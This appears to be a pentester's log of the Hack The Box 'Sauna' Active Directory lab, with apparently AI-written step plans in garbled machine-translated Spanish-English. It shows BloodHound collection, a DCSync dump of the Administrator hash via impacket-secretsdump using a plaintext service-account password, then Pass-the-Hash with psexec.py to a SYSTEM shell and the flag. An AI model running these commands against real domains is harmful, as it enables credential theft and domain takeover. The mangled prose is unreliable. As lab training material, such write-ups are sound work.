WARNING: Failed to get Kerberos TGT. Falling back to NTLM authentication. Error: [Errno Connection error (SAUNA.EGOTISTICAL-BANK.LOCAL:88)] [Errno -2] Name or service not known
INFO: Connecting to LDAP server: SAUNA.EGOTISTICAL-BANK.LOCAL
INFO: Testing resolved hostname connectivity dead:beef::7cc2:310a:b259:9b93
INFO: Trying LDAP connection to dead:beef::7cc2:310a:b259:9b93
INFO: Testing resolved hostname connectivity dead:beef::165
INFO: Trying LDAP connection to dead:beef::165
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 1 computers
INFO: Connecting to LDAP server: SAUNA.EGOTISTICAL-BANK.LOCAL
INFO: Testing resolved hostname connectivity dead:beef::7cc2:310a:b259:9b93
INFO: Trying LDAP connection to dead:beef::7cc2:310a:b259:9b93
INFO: Testing resolved hostname connectivity dead:beef::165
INFO: Trying LDAP connection to dead:beef::165
INFO: Found 7 users
INFO: Found 52 groups
INFO: Found 3 gpos
INFO: Found 1 ous
INFO: Found 19 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: SAUNA.EGOTISTICAL-BANK.LOCAL
INFO: Done in 00M 09S
  adding: 20260423232923_computers.json (deflated 76%)
  adding: 20260423232923_containers.json (deflated 93%)
  adding: 20260423232923_domains.json (deflated 79%)
  adding: 20260423232923_gpos.json (deflated 89%)
  adding: 20260423232923_groups.json (deflated 94%)
  adding: 20260423232923_ous.json (deflated 69%)
  adding: 20260423232923_users.json (deflated 92%)
.rw-r--r-- r4mon r4mon 4.1 KB Thu Apr 23 23:29:33 2026  20260423232923_computers.json
.rw-r--r-- r4mon r4mon  25 KB Thu Apr 23 23:29:28 2026  20260423232923_containers.json
.rw-r--r-- r4mon r4mon 3.5 KB Thu Apr 23 23:29:29 2026  20260423232923_domains.json
.rw-r--r-- r4mon r4mon 6.0 KB Thu Apr 23 23:29:27 2026  20260423232923_gpos.json
.rw-r--r-- r4mon r4mon  82 KB Thu Apr 23 23:29:27 2026  20260423232923_groups.json
.rw-r--r-- r4mon r4mon 1.9 KB Thu Apr 23 23:29:27 2026  20260423232923_ous.json
.rw-r--r-- r4mon r4mon  16 KB Thu Apr 23 23:29:26 2026  20260423232923_users.json
.rw-r--r-- r4mon r4mon  12 KB Thu Apr 23 23:29:33 2026  bloodhound_sauna.zip

## objective

Close correctly the phase of Active Directory collection, interpret what means the output obtenida and fijar a single next step for descubrir si `svc_loanmgr` has delegated rights of high value in the domain.

## Verified facts

The collection with `bloodhound-python` has funcionado correctly and has generado the artefactos esperados.

 have creado several files JSON and also a paquete listo for importar:

* `bloodhound_sauna.zip`

The autenticación with `svc_loanmgr` has sido sufficient for enumerar the domain, although the obtaining initial of TGT by Kerberos falló and the tool did **fallback a NTLM**. That not invalida the collection because, of fact, the proceso continuó and terminó with éxito.

The output confirms a context AD small and manejable:

* 1 domain
* 1 computer
* 7 users
* 52 groups
* 3 GPOs
* 1 OU
* 19 containers
* 0 trusts

The enumeration already not is a hipótesis: exists material sufficient for analyze relationships of control and delegated rights in BloodHound.

## assumptions

The inference main is that the value of `svc_loanmgr` sigue estando in permissions of domain and not in privileges local of the host.

Also is reasonable asumir that the fallo of Kerberos to the pedir TGT not is now the problema important, because the collection already salió adelante by NTLM and has producido the datos necesarios for analyze the graph.

The hipótesis of trabajo more strong is that the next hallazgo relevant aparecerá to the review si `svc_loanmgr` has relationships of control on the domain or on objects sensibles, especially rights of replicación or privileges equivalentes.

## method

First  cierra the phase of collection because already has cumplido su objective: obtain datos of AD with the account current.

Afterwards  evita volver a enumeration local or a secondary branches. What correct now is move of the recopilación to the analysis dirigido of the graph.

The single next step not is “mirar BloodHound without rumbo”, but rather open the graph and check of forma específica what rights has `svc_loanmgr`, empezando by consultas orientadas a relationships peligrosas on the domain.

## answer

This step has salido bien and leaves the machine in a point very good.

What important not is only that `bloodhound-python` haya generado files, but rather that already exists a basis real for responder the question clave of the case: **what can do `svc_loanmgr` in Active Directory**.

The detalle of the fallback a NTLM there is that leerlo correctly. Not is a derrota of Kerberos nor a signal of path muerta. Is only a tropiezo of resolution/name for the TGT initial. As the collection  completó and the JSON salieron bien, not merece the pena distraerse now with that. The decision correct is seguir adelante with the analysis.

The main branch active remains así: **analysis of BloodHound oriented a delegated rights of `svc_loanmgr`**.

The single next step more clean is **importar `bloodhound_sauna.zip` and review consultas dirigidas a privileges of replicación and relationships of control**, empezando by the current user.

**Dominant finding now:** already exists a collection válida of Active Directory hecha with `svc_loanmgr`.

**Active main branch:** analysis of delegated permissions and relationships of control in the domain.

**Secondary branches noted:** Correction futura of resolution Kerberos si hiciera falta, and the posibilidad lateral of `SeMachineAccountPrivilege`, but ambas remain in segundo plane.

**Single next step:** importar `bloodhound_sauna.zip` in BloodHound and review the rights efectivos of `svc_loanmgr` on the domain.

## commands

In the machine attacker:

```bash id="c1v7mz"
neo4j console
```

In otra terminal local:

```bash id="u8q2fk"
BloodHound
```

Afterwards, dentro of the interfaz:

1. iniciar sesión in BloodHound
2. importar `bloodhound_sauna.zip`
3. buscar the nodo `SVC_LOANMGR@EGOTISTICAL-BANK.LOCAL`
4. review consultas orientadas a privileges altos, in especial:

   * **Find Principals with DCSync Rights**
   * relationships directas from `SVC_LOANMGR`
   * edges on the domain `EGOTISTICAL-BANK.LOCAL`

By what  propone esto:

The signal previous already apunta with fuerza permissions of domain. Not has sentido seguir enumerando locally si already  dispone of the graph.

What is expected:

* a relationship clear between `svc_loanmgr` and algún derecho relevant in AD
* or, si not appears nada strong, a basis objetiva for reevaluar the next branch

Which part of the output really matters:

* si `SVC_LOANMGR` appears conectado to the domain with edges of high value
* especially relationships as `GetChanges`, `GetChangesAll` or equivalentes
* cualquier control on objects sensibles of the domain

How the next decision changes:

* si appears a derecho strong on the domain, the next phase quedará totalmente enfocada in that abuse specific
* si not appears nada relevant, entonces yes tocará reevaluar with otras rutas of AD or of the host

## checks

Check that BloodHound carga correctly the ZIP and shows the domain `EGOTISTICAL-BANK.LOCAL`.

Buscar first to the user `SVC_LOANMGR` and not empezar by vistas genéricas of the domain.

Si appears a arista of high value on the domain, fijarse in the **name exacto of the edge** and on what object cae.

Not perder time now afinando the problema of Kerberos/TGT, because the collection useful already is hecha.

## writeup_notes

The collection of BloodHound marcó the step of the enumeration of the host to the analysis estructurado of the domain. Although the obtaining initial of the TGT by Kerberos falló by a problema of resolution, the tool completó the collection mediante NTLM and generated a conjunto of datos sufficient for study relationships of control and delegated rights.

Reusable lesson: in Active Directory, a small fallo technical during the autenticación initial not siempre invalida the phase. Si the collection termina and produce datos useful, what correct is interpret the result global and avanzar to the analysis of the graph, in lugar of detenerse in a detalle that already not bloquea the investigación.

# We run the block and review the output

❯ sudo neo4j console
Directories in use:
home:         /usr/share/neo4j
config:       /usr/share/neo4j/conf
logs:         /etc/neo4j/logs
plugins:      /usr/share/neo4j/plugins
import:       /usr/share/neo4j/import
data:         /etc/neo4j/data
certificates: /usr/share/neo4j/certificates
licenses:     /usr/share/neo4j/licenses
run:          /var/lib/neo4j/run
Starting Neo4j.
2026-04-23 21:35:59.752+0000 INFO  Starting...
2026-04-23 21:36:00.182+0000 INFO  This instance is ServerId{775cd324} (775cd324-74c4-412b-9e46-9c187f67764a)
2026-04-23 21:36:01.185+0000 INFO  ======== Neo4j 4.4.16 ========
2026-04-23 21:36:02.544+0000 INFO  Initializing system graph model for component 'security-users' with version -1 and status UNINITIALIZED
2026-04-23 21:36:02.552+0000 INFO  Setting up initial user from defaults: neo4j
2026-04-23 21:36:02.553+0000 INFO  Creating new user 'neo4j' (passwordChangeRequired=true, suspended=false)
2026-04-23 21:36:02.575+0000 INFO  Setting version for 'security-users' to 3
2026-04-23 21:36:02.578+0000 INFO  After initialization of system graph model component 'security-users' have version 3 and status CURRENT
2026-04-23 21:36:02.583+0000 INFO  Performing postInitialization step for component 'security-users' with version 3 and status CURRENT
2026-04-23 21:36:02.887+0000 INFO  Bolt enabled on localhost:7687.
2026-04-23 21:36:03.558+0000 INFO  Remote interface available at http://localhost:7474/
2026-04-23 21:36:03.561+0000 INFO  id: D443307DA8287679E268157C4724A1C9DCCD79627BEC12417B229A3EF69CDA9E
2026-04-23 21:36:03.561+0000 INFO  name: system
2026-04-23 21:36:03.562+0000 INFO  creationDate: 2026-04-23T21:36:01.691Z
2026-04-23 21:36:03.562+0000 INFO  Started.

❯ cd /home/r4mon/pentest/targets/HTB/easy/SAUNA/
❯ bloodhound
[sudo] password for r4mon:

 It seems it's the first time you run BloodHound

 Please run BloodHound-setup first

Do you want to run BloodHound-setup now? [AND/n] and

 [*] Starting PostgreSQL service

 [*] Creating Database

 Creating database user

 Creating database
ALTER ROLE

 [*] Starting neo4j
Neo4j is running at pid 192150

 [i] You need to change the default password for neo4j
     Default credentials are user:neo4j password:neo4j

 [!] IMPORTANT: Once you have setup the new password, please update /etc/bhapi/bhapi.json with the new password before running bloodhound

 opening http://localhost:7474/
Running Firefox as root in a regular user's session is not supported.  ($XAUTHORITY is /home/r4mon/.Xauthority which is owned by r4mon.)

objective

Desbloquear the analysis local of BloodHound without touch more the objective and dejar list the importación of the graph already recolectado.

verified_facts

Neo4j already is arrancado correctly in the machine attacker and escucha in:

* `http://localhost:7474/`
* `bolt://localhost:7687`

Neo4j has creado the user initial `neo4j` and exige cambio of password in the primer access.

The collection of the domain already is hecha and exists a ZIP válido:

* `bloodhound_sauna.zip`

The bloqueo current not is in the objective nor in the credentials. Is in the attacker environment.

The intento of open BloodHound lanzó the navegador as root and by that Firefox what rechazó. That error not cuestiona nor the graph nor the account `svc_loanmgr`; only indica that the part local  is intentando open with the user equivocado.

assumptions

The inference main is that the next avance depends of terminar the inicialización local of Neo4j and lanzar the interfaz as user normal, not as root.

Also there is a posibilidad reasonable of that the paquete `bloodhound` instalado in the machine attacker not sea exactamente the cliente legacy classic, but rather a variante more nueva with su own inicialización. It is advisable tenerlo presente, but not does falta cambiar of branch still.

method

First  resuelve the requisito mínimo of Neo4j: cambiar the password initial from a navegador abierto as user normal.

Afterwards  actualiza the configuración local that the own asistente of BloodHound has pedido.

Only entonces  vuelve a lanzar BloodHound as user normal, without `sudo`.

answer

Now same not there is that volver to the host Windows. The next step correct is completamente in the machine attacker.

The reading good of what that has pasado is this: Neo4j already is bien, the graph already is recogido, and the single atasco real is that the primera ejecución of BloodHound quiso open the navegador as root. That is a problema of escritorio local, not of the laboratorio.

Así that the single next step correct is **open Neo4j in the navegador as `r4mon`, cambiar the password by defecto and afterwards volver a lanzar BloodHound without `sudo`**.

Dominant finding now: the domain already is recolectado and the single bloqueo is the preparación local of the viewer of the graph.

Active main branch: analysis of delegated permissions of Active Directory a basis of the ZIP already generado.

Secondary branches noted: posible desajuste between cliente legacy and stack more nuevo of BloodHound, but still as observation secondary.

Single next step: cambiar the password initial of Neo4j in the navegador as user normal and relanzar BloodHound without `sudo`.

commands

In a terminal local nueva, as `r4mon`, without `sudo`:

```bash id="n6k3pw"
xdg-open http://localhost:7474
```

Si `xdg-open` not abre nada, hacerlo manualmente from the navegador of the user normal and entrar in:

`http://localhost:7474`

Dentro of the navegador:

* user: `neo4j`
* password current: `neo4j`
* cambiarla by a nueva password that quede anotada

Afterwards, actualizar the file that te has indicado the own setup:

```bash id="m8r2qy"
sudo nano /etc/bhapi/bhapi.json
```

Ahí there is that sustituir the password antigua of Neo4j by the nueva that acabas of poner.

Then, already as user normal, without `sudo`:

```bash id="t4v7lx"
BloodHound
```

By what  propone esto:

The signal previous is clarísima: Neo4j already arrancó bien, BloodHound already dijo what requisito faltaba and the error of Firefox was only by abrirlo as root.

What is expected:

* access correct a Neo4j with password nueva
* configuración local actualizada
* lanzamiento of BloodHound without the error of the navegador as root

Which part of the output really matters:

* that the cambio of password in Neo4j  complete
* that `bloodhound` already not  queje of the setup initial
* that the interfaz quede operational for importar `bloodhound_sauna.zip`

How the next decision changes:

* si the interfaz abre bien, the next step será importar the ZIP and review específicamente what rights has `SVC_LOANMGR`
* si vuelve a aparecer a flujo raro of CE/web stack, entonces already habrá that decidir si seguir with that variante or use a cliente legacy more compatible with the JSON current

checks

Not close the terminal where Neo4j is corriendo.

Not volver a lanzar `bloodhound` with `sudo`.

Confirm that the password nueva of Neo4j remains also reflejada in `/etc/bhapi/bhapi.json`.

Si BloodHound abre bien, check before of nada that permita cargar the ZIP already generado.

writeup_notes

The enumeration of the domain already estaba completada; the single bloqueo later was local, in the machine attacker, to the iniciar the capa of visualización of the graph. Neo4j arrancó correctly, but the primera ejecución of BloodHound tried open the navegador as root, what that impidió completar the inicialización from the escritorio of the user.

Reusable lesson: in phases of analysis AD with BloodHound, it is advisable separar very bien tres planes distintos: collection of the domain, basis of datos of the graph and cliente visual. A veces the domain already is bien enumerado and the single problema real is in how  inicializa or  abre the interfaz local.

# We run the block and review the output

Image_1

❯ sudo nano /etc/bhapi/bhapi.json
Sustiutimos the password antigua by the nueva that hemos puesto in Neo4j and guardamos the file.

Entramos in the navegador with the nueva password and confirmamos that the access a Neo4j is correct. Image-2

Now yes, lanzamos BloodHound without `sudo`:

❯ cd /home/r4mon/pentest/targets/HTB/easy/SAUNA/
❯ bloodhound
[sudo] password for r4mon:

 Starting neo4j
Neo4j is running at pid 192150

 BloodHound will start

 IMPORTANT: It will take time, please wait...

{"time":"2026-04-24T00:09:52.226785257+02:00","level":"INFO","message":"Reading configuration found at","path":"/etc/bhapi/bhapi.json"}
{"time":"2026-04-24T00:09:52.226977457+02:00","level":"ERROR","message":"Unable to read configuration","config_file_path":"/etc/bhapi/bhapi.json","err":"invalid character 'i' looking for beginning of value"}

The error of JSON indica that the formato of the file `/etc/bhapi/bhapi.json` not is correct. Is probable that haya error of sintaxis, as a coma of more, a comilla mal closed or a carácter extraño.

Corregido the error of formato in the JSON, volvemos a lanzar BloodHound without `sudo`:

Now  executes but nos da several errores of SQLSTATE 42601, what that suggests that the cliente of BloodHound that estamos using not is compatible with the versión of Neo4j or with the formato of the JSON generados.

## objective

Desbloquear the analysis of the graph without perder more time in the instalación local and elegir the path more práctica for seguir with Sauna.

## Verified facts

The collection of datos of the domain already salió bien and generated the JSON and the ZIP. The bloqueo current is only in the capa local of BloodHound. The traza that has pegado shows that the aplicación falla during a migración SQL `v8.5.0` with `ERROR: syntax error at or near "STORAGE"`, así that now same the problema not is in `svc_loanmgr`, nor in the DC, nor in the credential, but rather in the stack local that tries arrancar BloodHound. Also, the documentación current of PostgreSQL define `SET STORAGE` as sintaxis of `ALTER TABLE`, not as part of a definición of columna dentro of `CREATE TABLE`, what that encaja with the tipo of error that estás viendo. ([PostgreSQL][1])

Also there is a signal important of mezcla of generaciones of tool: `bloodhound-python`  is presented explícitamente as **“for BloodHound LEGACY (BloodHound 4.2 and 4.3)”**, mientras that the documentación current of SpecterOps for BloodHound CE indica that **SharpHound CE is the recolector oficial** for CE, and that BloodHound CE usa arquitectura moderna distinta, with PostgreSQL for the basis of aplicación and Neo4j for the graph. ([BloodHound.specterops.io][2])

## assumptions

The inference reasonable is that now same estás peleándote with a combinación little agradecida: datos recogidos with a tool oriented a **Legacy**, but intentando analizarlos in a instalación **CE** that also is atascada in sus migraciones local. That inference not sale of intuición pura, but rather of juntar the dos signals anteriores. ([BloodHound.specterops.io][2])

## method

In lugar of seguir depurando BloodHound CE a these horas, the path more clean for this lab is cambiar a of these dos opciones:

1. use **BloodHound Legacy 4.3.1**, that encaja better with the output of `bloodhound-python`;
2. or prescindir of the viewer by now and seguir the case with the pista dominant already conocida: `svc_loanmgr` probablemente has delegated rights of domain and the comprobación clave será DCSync.

## answer

The conclusión práctica is this: **yo dejaría of pelearme now with BloodHound CE**.

Not because tu recogida esté mal, but rather because the atasco current is local, ajeno to the objective, and huele a mezcla of stack nuevo with flujo viejo. Tu evidence useful already the tienes. What more rentable for seguir with Sauna is:

* **Plan A**: open the JSON in **BloodHound Legacy 4.3.1**, that is what more coherente with `bloodhound-python`.
* **Plan B**: si not quieres seguir tocando BloodHound now, continuar directly with a Verification of permissions of domain from the account `svc_loanmgr`.

Dado the patrón classic of Sauna, the Verification with more value is check si `svc_loanmgr` can do **DCSync**. That not depends of that the viewer local esté fino.

**Dominant finding now:** the bloqueo is in BloodHound local, not in the exploitation nor in the account `svc_loanmgr`.

**Active main branch:** validación of permissions of domain of `svc_loanmgr`.

**Secondary branches noted:** arreglar CE more adelante or use Legacy for documentar visualmente the graph.

**Single next step:** probar si `svc_loanmgr` has capacidad efectiva of DCSync.

## commands

In the machine attacker:

```bash
impacket-secretsdump 'EGOTISTICAL-BANK.LOCAL/svc_loanmgr:Moneymakestheworldgoround!@10.129.95.180' -just-dc-user Administrator
```

By what this command and not otro:

The signal previous already is bastante strong. `svc_loanmgr` not destacó by privileges local, así that su value probable is in the domain. This prueba comprueba justo that of forma directa and short.

What does:

* usa the credential already validated of `svc_loanmgr`
* tries read only the hash of the `Administrator` of the DC
* evita extracción masiva innecesaria

What esperamos obtain:

* si has rights of replicación, devolverá the hash of `Administrator`
* si not the has, devolverá a error of permissions and entonces yes tocará volver a BloodHound or a otra enumeration AD

Which part of the output really matters:

* cualquier línea with `Administrator` and NTLM hash
* or a error clear of access denegado / privileges insuficientes

How the next decision changes:

* si returns the hash, the next phase será validate access with that identity
* si not, the next step será retomar the analysis of ACLs with Legacy or with otra path of enumeration AD

## checks

Si the command returns the hash of `Administrator`, not does falta seguir discutiendo with BloodHound for saber si the account had value: already estará demostrado.

Si falla by permissions, entonces the fallo yes será informativo and not a problema of the environment local. Ahí tocará volver to the analysis of graph with a tool more compatible with tus datos.

## writeup_notes

The collection of AD  completó, but the analysis visual with BloodHound CE was left bloqueado by a problema local of migraciones. In that point, the decision metodológicamente correct not was seguir perdiendo time in the tool, but rather volver a the evidence main of the case and validate of forma directa si the account `svc_loanmgr` had rights of replicación on the domain.

Reusable lesson: when a tool of analysis falla by the environment local, not it is advisable confundir that bloqueo with a fallo of the chain of exploitation. Si the evidence already apunta a permission specific, a veces is better verificarlo directly that seguir arreglando the viewer.

[1]: https://www.postgresql.org/docs/current/sql-altertable.html?utm_source=chatgpt.com "Documentation: 18: ALTER TABLE"
[2]: https://BloodHound.specterops.io/collect-data/ce-collection/sharphound?utm_source=chatgpt.com "SharpHound Community Edition"

## We run the block and review the output

❯ impacket-secretsdump 'EGOTISTICAL-BANK.LOCAL/svc_loanmgr:Moneymakestheworldgoround!@10.129.95.180' -just-dc-user Administrator
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies

[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:823452073d75b9d1cf70ebdf86c7f98e:::
[*] Kerberos keys grabbed
Administrator:aes256-cts-hmac-sha1-96:42ee4a7abee32410f470fed37ae9660535ac56eeb73928ec783b015d623fc657
Administrator:aes128-cts-hmac-sha1-96:a9f3769c592a8a231c3c972c4050be4e
Administrator:des-cbc-md5:fb8f321c64cea87f
[*] Cleaning up...

## objective

Close the phase of enumeration of permissions of domain, interpret correctly the result of `secretsdump` and fijar the single next step for transformar that permission in full control of the domain controller.

## Verified facts

The prueba has salido bien and of forma concluyente.

The account `svc_loanmgr` has podido ejecutar a operación of replicación contra the domain controller mediante `DRSUAPI`. That already not is a hipótesis nor a sospecha: remains demostrado that this account has permissions suficientes for realizar a **DCSync**.

The result useful more important is the NTLM hash of the administrator of the domain:

* user: `Administrator`
* RID: `500`
* NT hash: `823452073d75b9d1cf70ebdf86c7f98e`

Also  have obtenido claves Kerberos of the same user, but for the next step the pieza dominant is the **NT hash**.

With esto, the chain technical already remains demostrada until here:

* access initial with `fsmith`
* hallazgo of credential in AutoLogon
* Context switch a `svc_loanmgr`
* validación of permissions of replicación
* extracción of the material of autenticación of the `Administrator`

## assumptions

The inference main is that the next step natural already not is seguir enumerando Active Directory, because the account `svc_loanmgr` already has demostrado of forma práctica that has privileges of domain suficientes for extraer secretos of the DC.

The hipótesis more strong now is that the NTLM hash of the `Administrator` tendrá value operational inmediato mediante **Pass-the-Hash** contra the same host.

Also is reasonable asumir that, si that autenticación funciona, the context resultante será of very high privilege, normalmente `NT AUTHORITY\SYSTEM` or equivalente administrative total in the domain controller.

## method

First  cierra formalmente the phase AD of delegated permissions, because already has cumplido su función: demostrar and exploit DCSync with éxito.

Afterwards  evita open branches nuevas or seguir buscando more credentials. Already not does falta. The case has llegado to the point in that exists material sufficient for intentar full control of the host mediante a autenticación with hash.

The single next step correct is validate the hash of the `Administrator` with a technical of Pass-the-Hash oriented a obtain remote shell.

## answer

This result is the gran closure technical of the machine.

What important not is only that haya aparecido the hash of the `Administrator`, but rather what that that demuestra: `svc_loanmgr` not was simplemente an account useful, but rather an account with permissions of replicación on the domain. That resuelve of facto the incógnita main of the case.

A basis of here already not has sentido seguir with BloodHound, LDAP, SMB or more enumeration local. The phase of descubrimiento has terminado. The case entra in su phase final: **use the hash of the `Administrator` for obtain full control of the domain controller**.

The path more clean now is **Pass-the-Hash** with `psexec.py`, because:

* already exists a NT hash válido
* the objective is the own DC
* `psexec.py` suele dar a shell of high privilege very adecuada for close the machine

**Dominant finding now:** `svc_loanmgr` has capacidad efectiva of DCSync and has permitido extraer the NT hash of the `Administrator`.

**Active main branch:** reuse of the hash of the `Administrator` for obtain full control of the DC.

**Secondary branches noted:** ninguna relevant a short plazo; the chain main already is prácticamente closed.

**Single next step:** use the NT hash of the `Administrator` in a autenticación Pass-the-Hash for obtain remote shell.

## commands

```bash
psexec.py EGOTISTICAL-BANK.LOCAL/Administrator@10.129.95.180 -hashes aad3b435b51404eeaad3b435b51404ee:823452073d75b9d1cf70ebdf86c7f98e
```

By what  propone this command:

The signal previous already is definitiva:  dispone of a NT hash real of the `Administrator`. Not does falta recover cleartext password nor seguir buscando otras rutas.

What does:

* tries autenticarse as `Administrator` using Pass-the-Hash
* reutiliza the NTLM hash without necesidad of password in texto clear
* searches open a remote shell with privileges máximos in the host

What is expected:

* a remote shell válida of very high privilege
* normalmente a context `NT AUTHORITY\SYSTEM` or equivalente with full control of the DC

Which part of the output really matters:

* that the autenticación funcione
* that aparezca remote shell
* that the context efectivo sea administrative total

How the next decision changes:

* si entra, the next phase already not será of enumeration, but rather of Verification final of context and reading of the `root.txt`
* si fallara, the hash seguiría siendo valioso, but tocaría probar otra surface remote compatible with Pass-the-Hash

## checks

Si the shell entra, check enseguida:

```cmd
whoami
hostname
type C:\Users\Administrator\Desktop\root.txt
```

Matters confirm tres cosas:

* identity efectiva of the context
* that the host sigue siendo `SAUNA`
* that the final flag is accesible from that context

Not mezclar now more tools nor more branches. This point already is of closure.

## writeup_notes

The phase decisiva of Sauna not estuvo in a escalada local classic, but rather in identificar that `svc_loanmgr` had permissions of replicación on the domain. The prueba with `secretsdump` what confirmed of forma práctica to the extraer the material of the `Administrator`, what that allowed move directly a autenticación Pass-the-Hash for tomar full control of the domain controller.

Reusable lesson: when an account of domain allows DCSync, the investigación leaves of girar alrededor of the host local and moves a the capa more high of the environment. In that momento, the objective already not is encontrar otra escalada, but rather convert correctly that permission of replicación in control efectivo of the domain.

## We run the block and review the output

❯ psexec.py EGOTISTICAL-BANK.LOCAL/Administrator@10.129.95.180 -hashes aad3b435b51404eeaad3b435b51404ee:823452073d75b9d1cf70ebdf86c7f98e
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies

[*] Requesting shares on 10.129.95.180.....
[*] Found writable share ADMIN$
[*] Uploading file KUmmTKGx.exe
[*] Opening SVCManager on 10.129.95.180.....
[*] Creating service ZgwS on 10.129.95.180.....
[*] Starting service ZgwS.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.17763.973]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>

objective

Close the machine confirmando the context of máximo privilege, verify the access total to the domain controller and read the final flag.

verified_facts

The autenticación with Pass-the-Hash has funcionado correctly.

`psexec.py` has conseguido:

* access to the recurso `ADMIN$`
* subida of the binario of service
* creation and arranque of a service remote
* apertura of a shell in the objective

The shell already is abierta in:

`C:\Windows\system32>`

That confirms that the NTLM hash of the `Administrator` was válido and reusable for obtain full control of the host.

In this point, the chain completa of the case remains demostrada of extremo a extremo:

* obtaining of names from the web
* derivation of users
* ASREPRoasting on `fsmith`
* recovery offline of `Thestrokes23`
* access WinRM with `fsmith`
* hallazgo of credential of AutoLogon
* cambio a `svc_loanmgr`
* DCSync exitoso
* Pass-the-Hash with `Administrator`
* remote shell of máximo privilege

assumptions

The inference main is that the context current is administrative total on the domain controller.

Aun así, before of dar the machine by closed, it is advisable verify explícitamente the identity efectiva of the proceso and confirm access to the `root.txt`.

method

Not does falta seguir enumerando more.

The next step correct is do a Verification mínima and of closure:

* identity efectiva
* name of the host
* access to the final flag

answer

perfect. The machine is prácticamente closed.

What important now not is do more cosas, but rather confirm with limpieza that the context current is the esperado and close the case with evidence final.

The main branch already not is of exploitation nor of escalada: now is only **Final verification of full control**.

Dominant finding now: the hash of the `Administrator` has dado remote shell in the DC.

Active main branch: closure and Verification final of the full compromise.

Secondary branches noted: ninguna relevant; the chain main already is resuelta.

Single next step: verify identity efectiva and read `root.txt`.

commands

```cmd
whoami
hostname
type C:\Users\Administrator\Desktop\root.txt
```

Why these commands are proposed:

`whoami`  usa for confirm the context efectivo real of the shell. Although already todo apunta privilege máximo, matters dejarlo demostrado of forma explícita.

`hostname` sirve for fijar without ambigüedad that the access corresponde to the host objective `SAUNA`.

`type C:\Users\Administrator\Desktop\root.txt` cierra formalmente the machine, because demuestra access to the final flag from the context comprometido.

What is expected:

* a identity of very high privilege, normalmente `nt authority\system`
* the hostname `SAUNA`
* the contenido of the `root.txt`

Which part of the output really matters:

* the user efectivo
* the name of the host
* the final flag

How the next decision changes:

* si todo sale as  espera, the machine is closed
* a basis of ahí, already only quedará consolidar the writeup didactic

checks

Check that `whoami` returns context of privilege máximo.

Confirm that `hostname` sigue siendo `SAUNA`.

Verify that `root.txt` is legible from this shell.

writeup_notes

The closure of Sauna not dependió of a escalada local classic in the DC, but rather of a chain of Active Directory bien interpretada: identity public, abuse Kerberos, reuse of credentials, descubrimiento of AutoLogon, salto an account with delegated permissions and exploitation of DCSync for obtain the hash of the administrator. The access final by Pass-the-Hash confirmed the full control of the domain.

Reusable lesson: in entornos AD, an account apparently modest can esconder the verdadero point of quiebre of the case. When an account allows replicación of secretos of the domain, the objective leaves of be “escalar a little more” and moves a be convert correctly that permission in full control verificable.

## We run the block and review the output

C:\Windows\system32> whoami
nt authority\system

C:\Windows\system32> hostname
SAUNA

C:\Windows\system32> type C:\Users\Administrator\Desktop\root.txt
2ebc5339eff500834123056f79cad936

objective

Close formalmente the machine Sauna with evidence final of full compromise and dejar consolidada the chain technical completa for the futuro MD didactic.

verified_facts

The shell obtenida mediante Pass-the-Hash has privilege máximo in the objective.

The identity efectiva of the context current is:

* `nt authority\system`

The host comprometido is:

* `SAUNA`

The final flag has sido leído correctly from:

* `C:\Users\Administrator\Desktop\root.txt`

Value obtenido:

* `2ebc5339eff500834123056f79cad936`

With esto remains verified the full compromise of the domain controller.

assumptions

Already not remains ninguna hipótesis operational relevant for resolver the machine. The chain main is closed of extremo a extremo.

The single tarea pending a basis of here is editorial: consolidar the case in a writeup didactic clean, ordenado and trazable.

method

 toma the shell final and  verifica of forma mínima but sufficient:

* identity efectiva
* name of the host
* access to the final flag

Not  añaden more checks because already not aportan value a the resolution of the case.

answer

the machine is closed.

The evidence final confirms exactamente the result that  esperaba in the phase of closure:

* full control of the system
* context `SYSTEM`
* reading correct of the `root.txt`

The chain technical completa remains así:

1. enumeration initial of a environment Windows with signals clear of Active Directory;
2. uso of the public website as source of real names;
3. derivation of candidate users;
4. validación of the convention `inicial + apellido`;
5. obtaining of AS-REP hash for `fsmith`;
6. Offline password recovery `Thestrokes23`;
7. remote access by WinRM as `fsmith`;
8. hallazgo in the registry of credentials AutoLogon;
9. validación of the account real `svc_loanmgr`;
10. remote access by WinRM as `svc_loanmgr`;
11. comprobación of that the value real of the account estaba in Active Directory and not in privileges local;
12. ejecución of DCSync with `svc_loanmgr` for extraer the hash of the `Administrator`;
13. Pass-the-Hash with `Administrator`;
14. shell final as `nt authority\system`;
15. reading of the `root.txt`.

Dominant finding now: full compromise verified of the domain controller.

Active main branch: ninguna operational; the exploitation has terminado and the case is resuelto.

Secondary branches noted: ninguna necesaria for the resolution.

Single next step: consolidar todo in the MD final didactic.

commands

```cmd id="8u2vqm"
whoami
hostname
type C:\Users\Administrator\Desktop\root.txt
```

These tres commands cierran the machine because confirman what single that already importa to the final of the case:

* the nivel real of privilege
* the host comprometido
* the access to the final flag

checks

Check that the context is `nt authority\system`.

Check that the host sigue siendo `SAUNA`.

Check that the `root.txt` is legible and remains registrado correctly in the notes.

Dar by closed the part technical of exploitation and not seguir añadiendo noise innecesario.

writeup_notes

Sauna is a machine of Active Directory cuya resolution not depends of a single debilidad aislada, but rather of a chain bien interpretada. The public website aporta real names, esos names allow derivar users plausible, Kerberos ofrece a point of entrada mediante ASREPRoasting, the access initial conduce a credential exposed in AutoLogon and that segundan account revela su verdadero value in delegated permissions of domain. The point decisivo of the case llega when `svc_loanmgr` demuestra capacidad of DCSync, what that allows extraer the hash of the `Administrator` and convertirlo in full control mediante Pass-the-Hash.

Reusable lesson:

In Active Directory, an account apparently modest can be much more dangerous by sus delegated permissions in the domain that by sus privileges local in the host. By that, when an account not destaca locally, not it is advisable descartarla: a menudo the verdadero salto is in what that can do contra the domain and not in what that can do in the machine where  has iniciado sesión.
